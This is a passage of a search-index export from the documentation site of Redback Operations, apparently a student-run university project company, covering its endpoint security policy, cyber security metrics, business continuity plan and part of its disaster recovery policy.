may arise that demand use of portable storage methods such as USB drives or portable HDD / SSDs. Attention must be given to these devices to ensure the adequate security. Storage devices with sensitive data should be stored in locked containers when not in use. When in transit, these devices should be kept on the user or as close to as possible.  ","version":"Next","tagName":"h3"},{"title":"Devices​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#devices","content":" Device Storage​  Portable devices that contain sensitive data should be locked in secure containers when not in use to ensure full protection. Access to this storage should only be for approved users. Testing devices specific to Redback Operations such as VR headsets or exercise bicycles that may not be able to be contained in safes or secured draws should be kept in rooms with controlled access management and surveillance.  Asset Management​  Corporate devices should be registered in the company asset register, including current device holder and storage location. Corporate devices should have their asset number printed on them, as well as information for their return if found.  ","version":"Next","tagName":"h3"},{"title":"Accessories to Endpoints​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#accessories-to-endpoints","content":" Attention should be given to any accessories connected to Redback Operations affiliated devices. This includes peripherals such as keyboards, mice, headsets, and monitors, as well as storage devices and other devices that may have the ability to transmit data. Accessories should be purchased from trusted sites, and only used in a safe matter consistent with safe online practices. Any evidence of tampering or malicious files should be responded to with seizure of using the accessory and seeking assistance from IT leadership in taking the next steps to ensure safety of personal and corporate information on the host device.  ","version":"Next","tagName":"h3"},{"title":"Unattended Devices​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#unattended-devices","content":" Endpoints must engage a lock-out of content through a shutdown or sign-out after 15 minutes of inactivity to prevent potential bad actors getting access to the device. Regardless, users, especially those with privileged access, should be locking their devices immediately when leaving the direct area around it. Devices used for testing or experimental purposes may be configured to stay awake for the duration of their tasking if adequate signage is in place, or the presence of an approved user is nearby, additionally programs not necessary to the tasking should be locked down where relevant.  ","version":"Next","tagName":"h3"},{"title":"Minimum Security Requirements​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#minimum-security-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"Device Security​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#device-security","content":" All devices must use full disk encryption (e.g., BitLocker for Windows, FileVault for macOS).Screen locks must be enabled with an auto-lock timeout of 10 minutes or less, requiring authentication for access.Endpoints must engage a lock-out (shutdown or sign-out) after 15 minutes of inactivity, unless configured for testing purposes with adequate signage or supervision.  ","version":"Next","tagName":"h3"},{"title":"Antivirus and Malware Protection​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#antivirus-and-malware-protection","content":" All devices must run real-time antivirus/malware protection (e.g., Microsoft Defender, Sophos, Avast) with full settings enabled.Virus signatures and scanning engines must be updated weekly or more frequently.All Windows endpoints must, at a minimum, run Windows Defender with full settings.  ","version":"Next","tagName":"h3"},{"title":"Operating System and Software Updates​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#operating-system-and-software-updates","content":" Operating systems and applications must enable automatic updates where possible.Critical security patches must be applied within 48 hours of notification, and non-critical updates at the earliest reasonable time.Disconnected or obsolete operating systems (e.g., Windows 7, macOS less than 10.15) are prohibited, and end-of-life software must be removed with alternatives identified.  ","version":"Next","tagName":"h3"},{"title":"Application Control​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#application-control","content":" Only necessary and authorized software may be installed on Redback devices.Scripting environments (e.g. Python, PowerShell) must be used responsibly and only with permission to access sensitive systems.Unauthorized software installation is prohibited.  ","version":"Next","tagName":"h3"},{"title":"Administrator Privileges​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#administrator-privileges","content":" Routine operations must not use administrator/root accounts.Administrative access is restricted to system owners or those with absolute need, with specific permissions granted where possible.Non-administrative users must log into locked-down accounts via group policy to prevent changes to core operating system aspects.  ","version":"Next","tagName":"h3"},{"title":"Network Access​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#network-access","content":" Devices must connect only to secure, password-protected Wi-Fi networks.Public Wi-Fi requires a secure VPN (e.g. university VPN or approved equivalent).Software firewalls must be enabled on all devices (default for most operating systems).  ","version":"Next","tagName":"h3"},{"title":"Data Storage and Access​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#data-storage-and-access","content":" Sensitive data must not be stored on unauthorized cloud platforms (e.g. personal Google Drive, Dropbox) unless pre-approved.Local sensitive data must be minimized and encrypted.Sensitive and business-critical data should be stored on shared cloud repositories with relevant users, not locally.Offsite physical backups are recommended for added redundancy.  ","version":"Next","tagName":"h3"},{"title":"Authentication​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#authentication","content":" Two-factor or multi-factor authentication ('2FA/MFA') must be enabled wherever supported, using password and token generators (e.g., Authy, Google Authenticator) or physical tokens (e.g., Yubikey).Users must use a password manager and maintain strong password practices (e.g., passphrases, complex passwords, regular breach checks).  ","version":"Next","tagName":"h3"},{"title":"Redundancy and Backups​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#redundancy-and-backups","content":" Regular backups must be conducted to ensure data redundancy.Sensitive and business-critical data should be stored on shared cloud repositories, with offsite physical backups as an additional layer of redundancy.  ","version":"Next","tagName":"h3"},{"title":"Monitoring and Reporting​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#monitoring-and-reporting","content":" Device logs must be regularly reviewed to identify suspicious activity.Suspected malware, unauthorized access, or lost/stolen devices must be reported to the Redback Cybersecurity Team or project mentors within 24 hours.Redback may require device conformance checks before granting access to critical systems.  ","version":"Next","tagName":"h2"},{"title":"Training and Awareness​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#training-and-awareness","content":" All users must complete endpoint security awareness training upon joining Redback Operations, covering secure device use, data handling, phishing techniques, and incident reporting.Users with privileged access to systems must complete additional company-standard training.  ","version":"Next","tagName":"h2"},{"title":"Non-Compliance​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#non-compliance","content":" Failure to comply with this policy may result in:  Suspension of access to Redback resources.Referral to Deakin University IT and/or disciplinary action where warranted.Mandatory retraining or device security review.  ","version":"Next","tagName":"h2"},{"title":"Review and Maintenance​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#review-and-maintenance","content":" This policy will be reviewed every 6 months or upon significant changes to Redback’s operational model or security posture. Updates will be developed under version control and published on the Redback Documentation site. ","version":"Next","tagName":"h2"},{"title":"Cyber Security Metrics","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics","content":"","keywords":"","version":"Next"},{"title":"1. Level of Preparedness​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#1-level-of-preparedness","content":" How many devices are running outdated operating systems or software?How are security controls tested for effectiveness and assurance?How are security policies and procedures updated and communicated to students, and how is compliance monitored?How are we managing data classification and data retention policies, and how are those policies enforced?  ","version":"Next","tagName":"h2"},{"title":"2. Intrusion attempts​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#2-intrusion-attempts","content":" What is the average time it takes to investigate and respond to detected intrusion attempts?What measures are in place to prevent false positives and false negatives in intrusion detection systems?How many unauthorized access attempts have been detected and blocked by the firewall?  ","version":"Next","tagName":"h2"},{"title":"3. Security Incidents​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#3-security-incidents","content":" How is data recovery managed in the event of a security incident, and how are backups tested and validated?How is threat intelligence gathered and used to proactively detect and prevent security incidents?How is Redback Operations’ incident response plan updated and tested to ensure it remains effective and relevant?  ","version":"Next","tagName":"h2"},{"title":"4. Mean Time to Detect (MTTD)​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#4-mean-time-to-detect-mttd","content":" How long does it take for the team to become aware of security threats and incidents?How are security controls and monitoring tools tuned to improve detection and response times?How are false positives and false negatives addressed in the security monitoring process, and how is this process continually refined?  ","version":"Next","tagName":"h2"},{"title":"5. Mean Time to Resolve (MTTR)​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#5-mean-time-to-resolve-mttr","content":" How long does it to respond following immediate awareness of a cyber attackWhat are the key steps involved in the incident response process, and how are they tracked and measured?How are stakeholders, such as students and staff informed and kept up to date during the incident response process?  ","version":"Next","tagName":"h2"},{"title":"6. Mean Time to Contain (MTTC)​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#6-mean-time-to-contain-mttc","content":" How long does it take to contain identified internal and third-party attacks across all endpoints and systems from the time of initial detection?How do we measure improvement in the cybersecurity habits of your staff?How do you measure the reduction in incident frequency?  ","version":"Next","tagName":"h2"},{"title":"7. Access Management​","type":1,"pageTitle":"Cyber Security Metrics","url":"/redback-documentation/docs/company-policy/ISMS/cyber-security-metrics#7-access-management","content":" How is access to sensitive data and systems controlled and monitored, and how is privilege escalation prevented?Are all accounts secured with Muli-Factor Authentication (MFA)?Do we have a password policy addressing common malpractices, such as password recycling and weak passwords? ","version":"Next","tagName":"h2"},{"title":"Redback Operations Business Continuity Plan 2024-2025","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/Business Continuity Plan","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#1-introduction","content":" The Business Continuity Plan (BCP) will detail the actions to be taken to ensure that the company, REDBACK OPERATIONS, remains at minimal operational capacity to satisfy customer and production plans in the occurrence of various interruptions and events.  The document will dictate minimal actions ranging across a variety of scenarios, alongside general activities that need to be carried out pre and post scenario.  Note :- Please note that in-depth steps for assets and recovery will be detailed in the Redback Operations Disaster Recovery document, with only a surface level explanation described in this document.  ","version":"Next","tagName":"h2"},{"title":"2. Scope​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#2-scope","content":" The document is only scoped to the activities of Redback Operations as well as its assets (currently owned and expected). The document is only limited to the Geelong Waurn Ponds Campus environment in terms of physical activity.  ","version":"Next","tagName":"h2"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#3-stakeholders","content":" 3.1 The following stakeholders (Company Board) will have a copy of the BCP at all times, and will operate as the authoritative figures for the company overall. These members will also operate as the PRIMARY communicative and responsive figures between the company and other parties such as the Capstone Companies and Deakin University, as well as coordination between the various members of the company. The authoritative hierarchy is detailed from highest to lowest in numerical order below.  Company Director = Daniel LaiCompany Mentors = Ben StephensMorgaine BarterAshish ManchandaFatimeh Ansarizadeh Company Leaders = Matt HollingtonMehak  3.2 The following stakeholders (Project Leaders) will have a copy of the BCP at all times, and will operate as the authoritative figures for each project/team in the company. These members will also operate as the primary communicative figures between the company board and leaders and the relevant projects. Project Sub team leaders will report to these stakeholders  Project 1 (VR Suncycle &amp; Smart Bike) = Jai WattsProject 2 (Elderly Wearable Tech Sensors) = Aman KagProject 3 (Athlete Wearable Tech Sensors) = Brendan Kay, Ojasvi SinghProject 4 (Crowd Monitoring &amp; Player Tracking) = Saksham BehalData Warehousing = Joel DanielCyber Security = Joel Daniel  Note :- Projects can change over the trimesters and the above is not an exhaustive list. Names above are as of Trimester 1 (June 30th) 2024.  ","version":"Next","tagName":"h2"},{"title":"4. Emergency Essentials Kit​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#4-emergency-essentials-kit","content":" The Emergency Essentials Kit contains documents and content that provide information and credibility to the business’ operations and incurred activities from external parties such as banks, suppliers etc….  Due to the operating and digital nature of Redback Operations, the Digital Kit should be prioritized at the project and company level, while the Physical Kit should be created only for projects where there will be vital physical artifacts.  ","version":"Next","tagName":"h2"},{"title":"4.1 Digital Kit​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#41-digital-kit","content":" Ensure that only authorized entities, who would be the company board, have access to the digital kit.It is recommended to have at least two digital kits stored in separate locations/servers/file paths that can be accessed over the Internet or an Intranet line. Do note that saving the digital kit on removable storage media will count as a physical kit and thus adhere to the above section.It is further recommended to store the digital kit on two separate cloud platforms (Google Drive and Microsoft OneDrive or any combination of equivalents) to further secure against vendor specific disruptions or accessibility issues.  ","version":"Next","tagName":"h3"},{"title":"4.2 Physical Kit​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#42-physical-kit","content":" Ensure that the bag/box used to contain the relevant essentials is waterproof, fireproof and tamperproof as much as possible.It is recommended to have at least three of these kits, stored in different locations and far away from each other, accessible to a member of the company board (preferably the mentors or leaders). Project Leaders can have their own project-specific kits ready and distributed among their own members at their discretion. Ensure that the kit is secured from access by unauthorized entities, as these kits will contain sensitive information.Ensure a copy of physical artefacts (keys, ID cards etc….) are placed in the kit as required. However do note that artefacts that belong to extremely sensitive assets like administrators or central servers are to not be stored in the kit. Only the company board members may have these assets in a separate location.  ","version":"Next","tagName":"h3"},{"title":"4.3 Required Contents​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#43-required-contents","content":" The following items need to be present in the emergency essential kits that are prepared.  Business Operational Plans for the Trimester (in this instance it would be Tasks 2.1P, 5.1P and 10.1P alongside the T3 equivalent).Employee Register and Board Grouping.Documents regarding loans from financial institutions and third-parties.Documents regarding agreements with suppliers and vendors.Documents regarding contracts (alongside project progress if possible) with clients.Documents regarding insurance of assets.All Company-wide Policies (Cyber Security, Incident Response, Business Continuity Plan, Disaster Recovery etc….)Network and System Diagrams.Company Board and Leadership Contact Information.  Note :- The latest versions of the above as soon as possible need to be placed/updated in the kits.  ","version":"Next","tagName":"h3"},{"title":"5. Digital Backups, Asset Spares and Other Protection​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#5-digital-backups-asset-spares-and-other-protection","content":" This section will detail the relevant locations for the various digital backups, asset spares and parts that will be possessed by Redback Operations for redundancy and safekeeping, as well as any other protection and risk reduction mechanisms in place such as Insurance, Funds etc….  ","version":"Next","tagName":"h2"},{"title":"5.1 Digital Backups​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#51-digital-backups","content":" Digital Backups are in regard to large scale backups such as Virtual Machines, Datasets, Applications, Storage etc…..and thus do not fall under Digital Emergency Kits (which only contain critical files).  Digital Backups need to adhere to the following requirements:  Backups need to be carried out on a timely basis as below: Daily backups need to be made on-site prior to End of Day or immediately after End of Day if automated.Weekly backups need to be made can placed off-site, recommended to be done at the end of the work week or the weekend if automated. The backups need to follow the below types: Daily Backups can be either Incremental or Differential Backups.Weekly Backups need to be Full Backups. Backups need to be stored securely in separate locations from the main environment, with no connection (digital or physical) to it. However, at the company board’s discretion, ONLY ONE backup can be kept connected to the environment to facilitate quick recovery. At minimum there should be two backups, while adhering to the 2nd condition of this list. However, at the company board’s discretion, projects can keep their own backups as well, be it full or incremental or differential or mirror at their own discretion. Only authorized entities (adhering ONLY to the Stakeholders section in this document) are allowed to access, modify or delete backups and their storage location. These actions taken should be documented.  Any and all backups, be it at the company level or project level, need to have their records stored in the Digital Backups table (Table 1) found in the Appendix.  ","version":"Next","tagName":"h3"},{"title":"5.2 Asset Spares​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#52-asset-spares","content":" Asset Spares include full scale replicas of assets as well as spares at the parts level to replace and fix assets.  Asset Spares need to adhere to the following requirements:  Spares need to be routinely checked to ensure that no new replacements or fixing is required (ensure spares are maintained and in a ready-to-use state).It is recommended to have at minimum in storage: a. ONE full replicas of large scale assets (smart bike) b. THREE replicas of small scale assets (sensors, watches etc….) c. THREE spares of parts for building assets (circuit boards, frames etc…) d. TWO spares of tools e. ONE spares of large scale infrastructure (tables, saws etc…) However, at the company board’s and project leader’s discretion, the above number can be reduced to ONE at reasonable conditions.One replica at minimum can be stored in the same location as that of the main used items (spare parts can be increased to 2-3 based on usage) and work environment. All other replicas and spares need to be stored in other secure locations away from the work environment.Only authorized members (adhering to the Stakeholders section in this document AND authorized project members for each project specific item) are allowed to access the spares and the storage locations.  Any and all replicas and spares, be it at the company level or project level, need to have their records stored in the Asset Spares table (Table 2) found in the Appendix.  ","version":"Next","tagName":"h3"},{"title":"5.3 Insurance and Other​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#53-insurance-and-other","content":" Insurance and Other relate to the various financial, support plans and partnerships that the company has to mitigate and reduce negative impact as well as support restoration of assets, infrastructure and company operations from minimal function to general operational capabilities.  Insurance and Other need to adhere to the following criteria:  Policies, plans and agreements need to reviewed and agreed upon by the board and project leaders every trimester.The company board will have the final decision on any partnerships/policies/plans being placed into use. a. However the company board MUST gain approval where required from the School of IT per Deakin regulations and procedures.  Any and all policies/plans/partnerships, be it at the company level or project level, need to have their records stored in the Insurance and Other table (Table 3) found in the Appendix.  ","version":"Next","tagName":"h3"},{"title":"6. Immediate Response Plan​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#6-immediate-response-plan","content":" When an incident occurs that activates this plan, ensure the following responses are carried out (while recommended to follow in order, the order can be voided at the discretion of the authoritative figures in the Stakeholders section).  Establish communications among Stakeholders affirming everyone in contact and safe. a. Project leaders do the same with their project teams and give Stakeholders a periodical update.Check for injuries among company members and contact emergency services (see Emergency Contact List in Appendix) if required.Assess severity of incident.Assess accessibility and usability of company assets, environment and infrastructure. a. If required, evacuate the company working site and relocate to a safe location.Ensure that an emergency essentials kit is accessible and currently in possession among the company board.Check if company digital infrastructure and communication lines are active and accessible. a. If not, fall onto alternate lines and decided by the company board and project leaders.Brief company on incident status and damage findings. a. Ensure that Deakin University and other relevant partners (Capstone Unit companies, School of IT etc….) are in the loop.Implement continuity actions for critical operations and assets in the company. a. Refer the Disaster Recovery Documentation for more information.  Please note that should the above responses not be feasible in a situation, actions the preserve and protect the SAFETY AND WELLBEING OF HUMAN (AND WHEN APPLICABLE ANIMAL) LIFE should be PRIORITIZED FIRST over any other actions.  ","version":"Next","tagName":"h2"},{"title":"6.1 Evacuation Procedures​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#61-evacuation-procedures","content":" As current company operating physical environments are within Deakin University premises, adhere to the Deakin evacuation plans.  For large scale natural disasters, government evacuation and response plans supersede initial response procedures.  ","version":"Next","tagName":"h3"},{"title":"7. Continuity Plan​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#7-continuity-plan","content":" Once company members are confirmed to be secure (or at minimum the primary points of contacts and operations to maintain minimal operations), the following actions are to be carried out to maintain operational capabilities at acceptable levels:  Identify the critical/time-sensitive operations that are impacted and unable to operate at daily operational levels/output.If any non-impacted operations are functional, check the flexibility of members involved in other operations to temporarily assist in impacted operations. Members from other operations can be asked to assist only if necessary to maintain minimal operations. Analyze impacted operations and determine the effort and resources it would take from what assets and access are available to maintain minimal operational capacity. Efforts to push beyond minimal capacity or even reach normal operational capacity should NOT be attempted during this time unless surplus assets and effort are available to assure no below minimal performance in case of issues. Prioritize impacted operations that can be quickly restored to minimal operations and carry out the relevant actions. Order of impacted operations restoration to minimal operational capacity can be overridden by the company board at their discretion.  For a detailed view of which operations are considered critical in nature, their RPO, RTO and MTD as well as relevant continuation actions can be found in Table 4 in the Appendix.  For detailed views on recovery of assets and operations after minimal operational capacity, refer the Disaster Recovery Plan.  ","version":"Next","tagName":"h2"},{"title":"8. Review and Training​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#8-review-and-training","content":" Ensure that relevant evacuation plans and drills for physical locations and environments are executed for staff training once every trimester.While the BCP is for the stakeholder’s possession, allow new staff members to have a read through the plan barring the appendix (they should not possess the plan, nor have access to sensitive information relevant to the plan).Review the BCP on a regular basis (recommend once a trimester for the stakeholders, but at minimum it should be done annually a year from the last update/review). Changes done in this review include (but are not limited to) new procedures, updated sections etc….Note that the Appendix has to be kept updated as much as possible, and does not require a review time to be updated by authorized entities. Changes are not limited to but include: Structural Organization change.Change between partners.Changes to projects (new projects or defunct projects).Emergency Kits, Digital Kits and Backup storage updates.  ","version":"Next","tagName":"h2"},{"title":"Appendix​","type":1,"pageTitle":"Redback Operations Business Continuity Plan 2024-2025","url":"/redback-documentation/docs/company-policy/Business Continuity Plan#appendix","content":" For viewing the tables in the Appendix, please download the PDF file of the Business Continuity Plan that will be found in the PDF Downloads Page in Policies. ","version":"Next","tagName":"h2"},{"title":"Redback Operations Disaster Recovery Policy 2024-2025","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#overview","content":" This Disaster Recovery Plan (DR Plan) provides an operational handbook for recovering data and systems critical to Redback Operations' operation.  In case of disaster resulting in data loss or access to any assets/platforms or systems used by Redback Operations, this document should be consulted, and the relevant recovery plan should be actioned.  This plan will cover recovering all critical assets and platforms Redback Operations uses. We aim to guarantee business continuity, data availability and integrity, and information system uptime.  The objectives of this plan are the following:  To minimize interruptions to the normal operations.To limit the extent of disruption and damage.To minimize the economic impact of the interruption.To establish alternative means of operation in advance.To train personnel with emergency procedures.To provide for smooth and rapid restoration of service.  ","version":"Next","tagName":"h2"},{"title":"Policy Owners​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#policy-owners","content":" This policy is owned by the company board, including directors, mentors, and leaders.  Company Board as of Trimester 1 2024  Company Director = Daniel LaiCompany Mentors = Ben StephensMorgaine BarterAshish ManchandaFatimeh Ansarizadeh Company Leaders = Matt HollingtonMehak  ","version":"Next","tagName":"h2"},{"title":"Key Personnel​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#key-personnel","content":" Team Leaders must have a copy of this policy as they will act as disaster recovery team leads for their respective projects. A Company Leader or Mentor will be chosen to recover assets owned by Redback Operations as disaster recovery team lead.  Name\tPosition\tAddress\tTelephoneJai Watts\tProject 1 (VR Suncycle &amp; Smart Bike) Lead\t[Company Address]\t[Contact Number] Aman Kag\tProject 2 (Elderly Wearable Tech Sensors) Lead\t[Company Address]\t[Contact Number] Brendan Kay, Ojasvi Singh\tProject 3 (Athlete Wearable Tech Sensors) Lead\t[Company Address]\t[Contact Number] Saksham Behal\tProject 4 (Crowd Monitoring &amp; Player Tracking) Lead\t[Company Address]\t[Contact Number] Joel Daniel\tData Warehousing/Cyber Security Lead\t[Company Address]\t[Contact Number]  Table 1: Team Leaders as of Trimester 1 2024  ","version":"Next","tagName":"h2"},{"title":"Assets Covered in this Plan​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#assets-covered-in-this-plan","content":" Asset/Platform\tTeamGoogle Cloud Platform\tRedback Operations On-premise Virtual Machine\tRedback Operations Smart Bike\tProject 1 Sensors\tProject 2, Project 3  Table 2: Assets  ","version":"Next","tagName":"h2"},{"title":"General Disaster Recovery Procedures​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#general-disaster-recovery-procedures","content":" Upon discovering any disaster resulting in data loss or access to the assets defined in this document, the following disaster recovery initiation procedure should immediately commence.  Notify Company LeadersThe Disaster Recovery Lead is assigned to the relevant asset owner.Disaster Recovery Lead to set up a disaster recovery team comprised of relevant stakeholders and representatives from their project/teamDisaster Recovery Team to determine the scope and degree of disaster, including Assets/Systems AffectedData LostTime of Disaster The Disaster Recovery Lead will distribute the disaster recovery plan to all team members.  ","version":"Next","tagName":"h2"},{"title":"Application Profile​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#application-profile","content":" This section documents all critical software applications used by Redback Operations.  Application Name\tCritical?\tFixed Asset?\tManufacturer\tCommentsUNITY\tYes\tNo\tUnity Technologies\t1. Runs daily Firebase\tYes\tNo\tGoogle\t1. Runs daily Microsoft Planner\tYes\tNo\tAtlassian\t2. Runs weekly on Monday Google Cloud Platform\tYes\tNo\tGoogle\t1. Runs daily  Table 3: Critical Applications  Comment Legend​  Runs daily.Runs weekly on [Day].Runs monthly on [Day].  ","version":"Next","tagName":"h2"},{"title":"Inventory Profile​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#inventory-profile","content":" This section comprises the list of hardware devices used by Redback Operations. It includes the following inventory:  Processing units: Main servers for data processing.Disk units: Storage units for backups and data.Models: Specific hardware models in use.Workstation controllers: Controllers for managing multiple workstations.Personal computers: Computers assigned to employees.Spare workstations: Backup workstations for emergency use.Telephones: Office telecommunication devices.Air conditioners or heaters: Climate control units in server rooms.System printers: Printers used for office documentation.USB Devicesand diskette units: Backup storage media.Controllers, I/O processors: For managing inputs/outputs in network systems.General data communication equipment: Routers, switches.Spare displays, racks: Additional hardware components.Humidifiers or dehumidifiers: Environmental control in critical areas.  Manufacturer\tDescription\tModel\tSerial No.\tOwned/Leased\tCostDell\tProcessing Unit Server\tPowerEdge T30\t987654321\tOwned\t$2054 Dell\tBackup Server\tPowerEdge R450 Rack Server\t321231234\tOwned\t$6500 Seagate\tDisk Unit\tExpansion 5TB\t123456789\tLeased\t$300 HP\tSystem Printer\tENVY Inspire 7920e\t564738291\tOwned\t$151 Cisco\tRouter\t4000 Series\t234567890\tOwned\t$7000 Cisco\tSwitch\tCatalyst 9300 Series\t123131231\tOwned\t$4000 Lenovo\tPersonal Computer\tThinkCentre M720q\t345678901\tOwned\t$700 INVT\tAir Conditioner\tRack Precision Cooling System\t456789012\tOwned\t$50000 Kesnos\tDehumidifier\t120 Pints Energy Star Home\t678901234\tOwned\t$500  Table 4: Inventory Table of Hardware Devices  Miscellaneous Inventory​  This section includes additional essential non-fixed assets used in daily operations but not included in the main inventory:  Description\tQuantity\tCommentsUSB Devices\t100\tUsed for offsite data backup. COBOL Development Kits\t5\tLanguage software for legacy systems. Printer Paper\t500 reams\tEssential for printing project documents. Windows OS\t100\tRequired to perform day-to-day activities.  Table 5: Inventory Table of Miscellaneous Inventory  ","version":"Next","tagName":"h2"},{"title":"Information services backup procedures​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#information-services-backup-procedures","content":" Backup Server Daily, journal receivers are changed at 6:00 AM and at 6:00 PM.Daily, a save of changed objects in the following libraries and directories is done at 1:00 AM:  LIB_ACCOUNTINGLIB_HRDIR_PAYROLLDIR_OPERATIONSLIB_SALESLIB_MARKETINGDIR_SUPPORTLIB_IT  This procedure also saves the journals and journal receivers.  On Sunday at 4:30 AM a complete save of the system is done. All save media is stored off-site in a vault at SafeDataStorage, located in Melbourne. Personal Computer It is recommended that all personal computers be backed up. Copies of the personal computer files should be uploaded to the server on every Friday at 5:00 PM, just before a complete save of the system is done. It is then saved with the normal system save procedure. This provides for a more secure backup of personal computer-related systems where a local area disaster could wipe out important personal computer systems.  ","version":"Next","tagName":"h2"},{"title":"Disaster Recovery Procedures​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#disaster-recovery-procedures","content":" Emergency Response Procedures​  Emergency response aims primarily at saving lives and reducing destruction caused by fire, natural disaster or other critical incidents. The following are immediate activities:  Evacuation Procedures: Clearly identified exits and the way to evacuate. Regular practices should be done to ensure that all staff members know evacuation procedures.Emergency Services Notification: Immediate contact with fire, medical or police services is necessary when required.Emergency Command Center: A command center either on-site or nearby for coordinating the emergency response has to be set up.  Recovery Actions Procedures​  These procedures are essential in preserving the necessary data processing operational tasks that enable them to continue with minimal interruptions:  Data Backup: Regular backups of all important data should be made and stored in a remote site. These back-ups go through regular tests so that they can be restored if need arises.Cloud Services: Access to applications and information from cloud computing resources should be maintained remotely.Alternate Processing Facility: A third-party facility agreement or mobile site use for business continuity.  These are the steps to take in order to recover data processing systems quickly after a disaster:  Assessment and Evaluation: Evaluate what happened in terms of its impact on data processing systems.Restoration Plan: Put into effect a well-structured plan to restore hardware, software, and data from backups.Testing: After restoration, confirm that all the systems have been restored back to normal functioning again including security wise.  ","version":"Next","tagName":"h2"},{"title":"Disaster Action Checklist​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 